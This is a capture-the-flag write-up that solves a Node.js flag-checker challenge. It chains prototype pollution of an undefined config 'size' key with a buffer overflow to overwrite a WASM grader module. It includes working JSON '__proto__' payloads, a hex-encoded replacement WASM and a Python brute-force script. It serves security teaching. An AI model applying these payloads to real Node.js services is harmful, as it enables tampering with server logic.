## About the Challenge
This challenge involves a *simple* flag checker. We are greeted by a flag input page for the user to input the flag, and it is checked by the server

<img width="404" alt="about1" src="https://github.com/user-attachments/assets/19cb8fd5-c7a9-4316-80fa-fd13cb83a43f">

<img width="389" alt="about2" src="https://github.com/user-attachments/assets/63e19270-82a2-4e8d-b60f-1ddf27389c9a">


Using BurpSuite, we can investigate what requests are being sent as well. 

<img width="266" alt="about3" src="https://github.com/user-attachments/assets/bbd329bf-cf63-4081-a85a-dac9b4be7322">

When we click submit, the above JSON is being sent. We can see that our text is encoded to hex before being sent over to the server. 

## Inspecting the Source Code
The most important function in the main.py is the /grade endpoint. 
**main.py**
```python
@app.route("/grade", methods=["POST"])
def receive_grade():
    data = request.get_json()
    data = json.dumps(data).encode()

    try:
        out = subprocess.check_output(
            [
                "node",
                os.path.join(cur_dir, "../backend/index.js"),
                base64.b64encode(data),
            ]
        ).decode()
        if int(out) < 3:
            print("solve", data)
            return json.load(open(os.path.join(cur_dir, "../config.json")))["flag"]
        else:
            print(out)
            return "Wrong answer!"
    except Exception:
        return "Process crashed or didn't return an integer"
 ```
 Basically, the JSON sent is decoded at this endpoint. Then, the data is encoded to base64, then sent run in the index.js file. If the console output of this file is less than 3, then the flag is returned. 
 
 This means that as long as we somehow get the javascript to log a number less than 3, we will get the flag.

Lets examine the index.js file.
**index.js**
```javascript
const fs = require("fs");
const code = fs.readFileSync(__dirname + "/grader/grader.wasm");

const util = require("./util.js")
const grader = require("./grader")
const flag = util.config.flag;


const src = JSON.parse(atob(process.argv[2]));

const dst = {};
util.copy(src, dst);

const input = dst["input"];

if (!input) {
    console.log("???");
} else {
    console.log(grader(code, input, flag));
}
```
This code reads a WASM file. It then decodes the input provided from the python file, then copys the input into the `dst` object using `util.copy`.

Afterwards, the wasm is sent together with the input and the flag is sent into the grader function. 

**util.js**
```javascript
const config = require("../config.json");

function decode_user_hex_string(str) {
    const length = config.size;

    const buf = new Uint8Array(Buffer.from("a".repeat(length)).buffer);

    for (let i = 0; i < length * 2; i += 2) {
        const byte = parseInt(str.substring(i, i + 2), 16);
        if (Number.isNaN(byte)) {
            buf[i >>> 1] = 0;
        }
        buf[i >>> 1] = byte;
    }
    return buf;
}
```
This function converts the hex string sent from the website into a Uint8Array. First, it creates a buffer containing binary data using a bunch of "a"'s, which is repeated by the provided size. 

**utils.js**
```javascript
module.exports.copy = function copy(src, dst) {
    for (const key of Object.keys(src)) {
        const val = src[key];
        if (is_object(val)) {
            copy(src[key], dst[key]);
        } else if (typeof val == "string") {
            dst[key] = decode_user_hex_string(src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}
```
This function is the ``copy`` function we saw in the index.js file. Basically, it takes the object input and copies it into the destination object. 

**grader/utils.js**
```javascript
const memory = new WebAssembly.Memory({ initial: 1 });
const imports = {
  env: {
    memory: memory,
  },
};

const buf = new Uint8Array(memory.buffer);


module.exports = (code, input, flag) => {
  for (let i = 0; i < flag.length; i++) {
    buf[i + 100] = flag.charCodeAt(i);
  }

  let input_len = 0;
  while (input_len < 100 && input[input_len] != 0) {
    buf[input_len] = input[input_len];
    input_len++;
  }

  const module = new WebAssembly.Module(code);
  return new WebAssembly.Instance(module, imports).exports.levenshtein(input_len, flag.length);
}
```
This is the grader function called in *index.js*. A buffer is created for the flag and the user input to be compared with, and sent to the wasm code to be processed. It seem's that the levenshtein function is being used, which basically finds the edit distance between the user's input and the actual flag. The flag and input length is also being checked and only the first 100 is used, meaning causing an overflow here is likely impossible.

## Solving Process Pt 1 (Prototype Pollution)
The challenge name gives a hint as to what the vulnerability is, [**prototype pollution**](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution).
Usually, when an object in javascript is copied into another object improperly, prototype pollution will happen.
This is what happens in the **utils.copy** function. 
```javascript
copy(src[key], dst[key]);
...
dst[key] = src[key];
```
These lines are where the prototype pollution occurs. If the key is ```__proto__```, then ```copy(src[key], dst[key]);``` will copy the value's in our payload into the proto.

Prototype pollution basically allows us to replace all object's default key values. So, if an object tries to access a key which doesn't exist, we can use this prototype pollution to input our own value for this key.

Now, we need somewhere to apply this prototype pollution. I decided to investigate the ``decode_user_hex_string`` further as it was suspicious. My logic was this:
 1. It doesn't really make sense that the user input need's to be converted into hex in the first place, and then combined into a Uint8Array, unless it was required for the challenge solution
 2. Inside the *grader/index.js* file, the plain text does not use a Uint8Array, and instead just takes plain text, and directly writes it to the memory buffer. Why have two different ways to handle the same type of data?

Sure enough, there was a undefined key inside this function.
```javascript
const config = require("../config.json");

function decode_user_hex_string(str) {
	const length = config.size;
	...
```
This line calls the ``size`` of the config object, however, when this is what's inside the config.json file:
```json
{
    "flag":"grey{fake_flag_for_testing}",
    "length": 32
}
```
Notice how there's a ``length`` key but no ``size`` key? This means when ``size`` key has not been set. This allows us to use prototype pollution to set the size to whatever we want. 

**Example Payload**
```json
{
    "__proto__":{
        "size":3000
    },
    "input":newdata
}
```

## Solving Process Pt 2 (Pwn)
After finding the prototype pollution, I was sure I was on the right track. I tried setting the size to the following values, then directly running the code to see what would happen.
I tried the following payloads:

 1. Non-Integer sizes (strings, objects)
 2. Negative Sizes
 3. Large Sizes

I found something interesting when experimenting with large sizes. Setting very large sizes didn't yield anything, but setting the sizes somewhere between the range 1000 to 3000 resulted in the following error message:
```javascript
...\grader\index.js:35
  const module = new WebAssembly.Module(code);
                 ^

CompileError: WebAssembly.Module(): expected magic word 00 61 73 6d, found 00 00 00 00 @+0
```
printing out the code buffer, we get:
```javascript
<Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 687 more bytes>
```
There's a bunch of `0`'s in our code buffer. This only happened when i increased the size to this range, so I hypothesised that maybe, the data from the Uint8Array being created from the ``decode_user_hex_string`` was somehow "overflowing" into the code buffer for some reason, from the following code:
```javascript
const buf = new Uint8Array(Buffer.from("a".repeat(length)).buffer);
    for (let i = 0; i < length * 2; i += 2) {
        const byte = parseInt(str.substring(i, i + 2), 16);
        if (Number.isNaN(byte)) {
            buf[i >>> 1] = 0;
        }
        buf[i >>> 1] = byte;
    }
```
If my hypothesis was correct, then by modifying the "input" of the payload to be filled with a bunch of `1`'s instead, our code buffer would also be filled with a bunch of `1`'s
```javascript
data = "11".repeat(2000)
size = 1000
var src = `{
    "__proto__":{
        "size":${size}
    },
    "input":"${data}"
}`; 
```
And indeed it worked:
```javascript
<Buffer 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 ... 687 more bytes>
```
So we know we can write our own data into the ``code`` buffer by editting the ``input`` by some further testing, I figured out that it was only after a certain threshold where the data from my ``input`` would be written into the ``code`` buffer.

## Solving Process Pt 3 (Editting the WASM)
Since we can actively change what's in the code buffer, we can just change what the code does. Instead of making it do a leveinstein distance calculation, we can just make it always return 0, and the javascript will query our malicious function instead of the original, intended code.

I got ChatGPT to craft some `.wat` code to have a function called ``levenshtein`` which will always return 0. 
```javascript
(module
  (type $t0 (func (param i32 i32) (result i32)))
  (import "env" "memory" (memory $env.memory 0))
  (func $levenshtein (export "levenshtein") (type $t0) (param $p0 i32) (param $p1 i32) (result i32)
    ;; Immediately return 0
    (i32.const 0)
  )
  (export "memory" (memory $env.memory)))
```
I used an [online compiler](https://webassembly.github.io/wabt/demo/wat2wasm/) to convert from wat to wasm. Extract the binary data in hex form and try to pass it into the ``input`` of our payload. (You may need to adjust the number of bytes in front of your wasm until you get it running)
```javascript
data = "11".repeat(904)+"0061736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a0601040041000b0038046e616d65010e01000b6c6576656e73687465696e020b010002000270300102703104050100027430060d01000a656e762e6d656d6f7279"
size = 3000
var src = `{
    "__proto__":{
        "size":${size}
    },
    "input":"${data}"
}`;
```
This doesn't quite work yet, but produces a different error:
```javascript
...\dist-proto_grader\backend\grader\index.js:35
  const module = new WebAssembly.Module(code);
                 ^
CompileError: WebAssembly.Module(): expected string length @+132
```
This is because the original wasm code's byte size and our code's byte size does not match up, so the javascript throws an error. So the final step we need to do is to make the wasm length's match up. The original code was `737 bytes` long, while our code is only `130 bytes` long. We can add the remaining `607 bytes` by adding section bytes to the end of our code.

 Adding the section header bytes ``00 DC 04`` to the end of our existing wasm extends the size of our wasm. The first byte ``00`` is the section id byte in wasm, while ``DC 04`` is 604 in [ULEB](https://en.wikipedia.org/wiki/LEB128) encoding, indicating the size of the section. This size combined with the 3 bytes from the section headers accounts for our missing ```607 bytes```. Since the remaining bytes are set to null bytes by the below line in the ``decode_user_hex_string`` function, the section that we add is simply a null section which does not affect the wasm file, other than increasing it's size.
 ```javascript
if (Number.isNaN(byte)) {
     buf[i >>> 1] = 0;
}
```

Thus our (almost) final payload
```javascript
data = "11".repeat(904)+"0061736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a0601040041000b0038046e616d65010e01000b6c6576656e73687465696e020b010002000270300102703104050100027430060d01000a656e762e6d656d6f727900dc04"
size = 3000
var src = `{
    "__proto__":{
        "size":${size}
    },
    "input":"${data}"
}`;
```
Which works (on my device)
*output*
```javascript
<Buffer 00 61 73 6d 01 00 00 00 01 07 01 60 02 7f 7f 01 7f 02 0f 01 03 65 6e 76 06 6d 65 6d 6f 72 79 02 00 00 03 02 01 00 07 18 02 0b 6c 65 76 65 6e 73 68 74 ... 687 more bytes>
0
```

## Solving Process Pt 4 (Brute Forcing the required Padding Bytes)
Recall that I needed to add a few bytes to the beginning of my code to make it work:
```javascript
data = "11".repeat(904)+...
```
After some testing, the number required to be added varies depending device, as well the source code as well. So we'll need to keep testing each possible pad size until our payload works. Heres the code for that:
```python
import requests 
data = "61736d0100000001070160027f7f017f020f0103656e76066d656d6f7279020000030201000718020b6c6576656e73687465696e0000066d656d6f727902000a0601040041000b0038046e616d65010e01000b6c6576656e73687465696e020b010002000270300102703104050100027430060d01000a656e762e6d656d6f727900dc04"
for i in range(0,1000):
    if i%100 == 0:
        print(i)
    newdata = "00"*i + data 
    endpoint = "http://localhost:8000/grade/grade"
    response = requests.post(endpoint,json = 
        {
        "__proto__":{
            "size":3000
        },
        "input":newdata
    })
    if "Process crashed or didn't return an integer" in response.text or "Wrong Answer" in response.text:
        continue 
    print(response.text)
```

## The Flag
*`grey{n0d3j5_3v3ry7h1n6_p0llu710n}`*

## TLDR
### Step 1: Find the Prototype Pollution
There is a prototype pollution present in ``util.copy`` Use it to pollute the ``size`` key, which is used in ``utils.decode_user_hex_string``
### Step 2: Find the Pwn
Between ranges ``1000 to 3000`` of the size value, data overflows from the ``input`` key into the ``code`` variable, allowing you to overwrite the wasm with your own malicious wasm.
### Step 3: Overwriting the WASM
Craft and Compile your own WASM code to return 0 whenever the levenshtein function is called. Add appropriate section header bytes (`sectionId`, `sectionSize`) to your WASM to extend the size of the WASM to be the same as the original WASM (737 bytes)
### Step 4: Brute Forcing the Pad Size
Craft a programme to brute force the number of pad bytes needed to be added in front of the ``input`` in order for the code to be executed. 
## Comments and Afterthoughts
I found out afterwards that there's a reported github issue on this:
https://github.com/nodejs/node/issues/41467

An interesting thing I found that when the source code's length was too large, or if the size given was too large, the code would run perfectly fine, without the vulnerability. I'm not experienced with PWN at all to know why, but I thought it was rather weird (and painful).

At first, I tried to inspect the levenstein wasm code to find some vulnerability in it. Thankfully, this was not a RE challenge. Not that a PWN challenge is any better but you get the idea. 

Also it is as of writing this writeup that I have just realised i did not notice there was an entire assembly folder for the wasm code OOPS thankfully its not really relevant to the challenge :P

This is my first time doing anything remotely related to pwn, so I'm glad I managed to solve it within the time allocated. Lots of braincell's were definitely lost though. 

This is probably one of the best web challenges I've done (and solved). In fact, I think all of the web challenges in this CTF were pretty good. Props to the challenge creators (And thanks for giving the source code to all challenges instead of making us do blind web exploitations ;-;)
